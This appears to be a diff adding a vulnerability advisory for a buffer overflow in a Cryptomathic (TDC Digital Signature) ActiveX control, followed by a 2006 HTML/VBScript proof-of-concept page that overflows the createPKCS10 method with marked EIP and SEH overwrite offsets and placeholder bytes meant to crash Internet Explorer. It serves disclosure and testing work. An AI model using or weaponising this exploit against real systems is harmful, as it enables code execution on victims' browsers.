@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/17852/info
+
+Cryptomathic ActiveX control is prone to a buffer-overflow vulnerability. The software fails to perform sufficient bounds-checking of user-supplied input before copying it to an insufficiently sized memory buffer.
+
+Invoking the object from a malicious website or HTML email may trigger the condition. If the vulnerability were successfully exploited, this would corrupt process memory, resulting in arbitrary code execution. Arbitrary code would be executed in the context of the client application.
+
+<html> <head> <title>CIRT.DK - Cryptomathic ActiveX Buffer Overflow</title> <IMG SRC="http://www.cirt.dk/images/logo.jpg"> </head> <body> <center> <h1>TDC Digital Signature ActiveX Buffer Overflow</h1> <h4> (c)2006 by Dennis Rand - CIRT.DK</h4> The following Proof-of-Concept will make Internet Explorer shutdown, if you are vulnerable.<br> </center> <br> <script>alert('Press "OK" to see if you are vulnerable')</script> <object classid='clsid:6DA9275C-64E5-42A1-879C-D90B5F0DC5B4' id='target' ></object> <script language='vbscript'> arg1 = String(8, "A") arg1 = arg1 + "ABCD" ' EIP is overwritten here arg1 = arg1 + String(64, "B") arg1 = arg1 + "AABB"	 ' Pointer to the next SEH Handler arg1 = arg1 + "BBAA" ' SE Handler arg1 = arg1 + String(700, "C") arg2 = "DefaultV" target.createPKCS10 arg1 ,arg2 </script> <script>alert('You are secure')</script> </body> </html>
